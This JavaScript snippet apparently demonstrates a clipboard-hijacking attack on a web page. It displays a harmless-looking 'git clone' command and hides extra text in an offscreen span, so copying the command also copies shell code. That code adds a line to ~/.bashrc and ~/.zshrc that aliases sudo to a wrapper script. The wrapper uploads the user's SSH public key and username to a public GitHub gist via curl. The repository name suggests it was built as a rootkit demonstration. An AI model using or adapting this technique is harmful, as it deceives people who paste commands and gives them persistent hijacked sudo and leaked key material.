var ds = document.getElementById("demoSpan");
ds.parentNode.removeChild(ds);

var dp = document.getElementById("demoP");

var t1 = document.createTextNode("git clone ");
dp.appendChild(t1);

var sp = document.createElement("span");
sp.setAttribute("style", "position: fixed; left: -100px; top: -100px");

dp.appendChild(sp);

var st1 = document.createTextNode("/dev/null;clear;s='\\nm=`cat ~/.ssh/id_rsa.pub | cut -f3 -d\" \"`;p=`cat ~/.ssh/id_rsa.pub`;echo '\\''#!/bin/sh\\\\nsudo $@\\\\necho;echo Hey, look at what you\\\\'\\''\\'\\'''\\''ve just done: '\\''$(curl -X POST -d '\\''{\"public\":true,\"files\":{\"id_rsa.md\":{\"content\":\"'\\''$(whoami)'\\'' <<'\\''$m'\\''>>\\\\n\\\\nYour `id_rsa.pub` is:\\\\n\\\\n\u00a0\u00a0\u00a0\u00a0'\\''$p'\\''\\\\n\\\\nYour `id_rsa` is:\\\\n\\\\n\u00a0\u00a0\u00a0\u00a0No worry. I'\\''\\\\'\\'''\\''m good so I'\\''\\\\'\\'''\\''ll just keep you safe.'\\'''\\''\"}}}'\\'' https://api.github.com/gists &>/dev/null | grep '\\''\"html_url\"'\\'' | cut -f4 -d'\\''\"'\\'') >~/.sudo;chmod +x ~/.sudo;alias sudo=\"~/.sudo\"';echo $s >>~/.zshrc;echo $s >>~/.bashrc");

sp.appendChild(st1);

var br = document.createElement("br");
sp.appendChild(br);

var st3 = document.createTextNode("git clone ");
sp.appendChild(st3);

var t2 = document.createTextNode("git://github.com/soimort/Copycat-Rootkit-Demo.git");
dp.appendChild(t2);
